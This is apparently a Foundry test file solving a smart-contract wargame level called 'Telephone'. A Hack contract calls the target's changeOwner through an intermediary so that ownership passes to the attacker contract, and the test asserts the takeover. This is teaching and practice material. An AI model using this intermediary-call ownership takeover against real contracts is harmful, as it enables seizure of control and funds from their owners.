// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {Telephone} from "../src/4.Telephone.sol";

contract Hack {
   function changeOwner(Telephone telephone) external {
     telephone.changeOwner(address(this));
   }
}

contract TelephoneHackTest is Test{
    Telephone telephone;
    Hack hack;
    function setUp() public {
        telephone = new Telephone();
        hack = new Hack();
    }
    function hackVector() internal {
        hack.changeOwner(telephone);
    }
    function testTelephoneHack() public {
        hackVector();
        assertEq(telephone.owner(), address(hack));
    }
}